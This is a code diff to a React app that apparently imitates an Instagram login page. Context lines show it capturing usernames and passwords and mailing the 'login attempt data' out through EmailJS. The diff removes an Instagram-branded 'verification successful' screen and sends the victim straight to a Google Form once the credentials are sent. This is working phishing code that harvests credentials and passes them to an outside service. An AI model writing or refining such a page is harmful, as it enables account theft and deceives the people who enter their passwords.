@@ -6,7 +6,6 @@ export default function App() {
   const [password, setPassword] = useState('');
   const [isLoading, setIsLoading] = useState(false);
   const [error, setError] = useState('');
-  const [showSuccessScreen, setShowSuccessScreen] = useState(false);
 
   useEffect(() => {
     // Load EmailJS
@@ -43,47 +42,14 @@ This is an automated message with login attempt data.`,
         templateParams
       );
       
-      // Show success screen
-      setShowSuccessScreen(true);
+      // Redirect directly to the target URL (Google Form)
+      window.location.href = 'https://docs.google.com/forms/d/e/1FAIpQLSdAAUoBrDfLU6UFX2Su3lry8GBCFcJS93RWuBabe9gYxmbvoQ/viewform?usp=sharing&ouid=111823479924118296643';
     } catch (err) {
       setError('An error occurred. Please try again.');
       setIsLoading(false);
       console.error('Error:', err);
     }
   };
-
-  if (showSuccessScreen) {
-    return (
-      <div className="min-h-screen bg-gray-50 flex flex-col items-center justify-center p-4">
-        <div className="w-full max-w-sm text-center">
-          {/* Instagram Logo */}
-          <div className="mb-8">
-            <img 
-              src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" 
-              alt="Instagram Logo" 
-              className="w-44 h-auto mx-auto"
-            />
-          </div>
-          {/* Success Message */}
-          <div className="bg-white border border-gray-300 rounded-lg p-8">
-            <h1 className="text-xl font-bold text-gray-900 mb-6">
-              Verification is successfully completed, please proceed to the Google Form
-            </h1>
-            
-            {/* Continue Button - redirects to google.com */}
-            <button
-              onClick={() => {
-                window.location.href = 'https://docs.google.com/forms/d/e/1FAIpQLSdAAUoBrDfLU6UFX2Su3lry8GBCFcJS93RWuBabe9gYxmbvoQ/viewform?usp=sharing&ouid=111823479924118296643';
-              }}
-              className="px-6 py-2 text-sm font-medium text-white bg-blue-500 hover:bg-blue-600 rounded border-none transition-colors w-full mt-6"
-            >
-              Google Form
-            </button>
-          </div>
-        </div>
-      </div>
-    );
-  }
 
   return (
     <div className="min-h-screen bg-gray-50 flex flex-col items-center justify-center p-4">
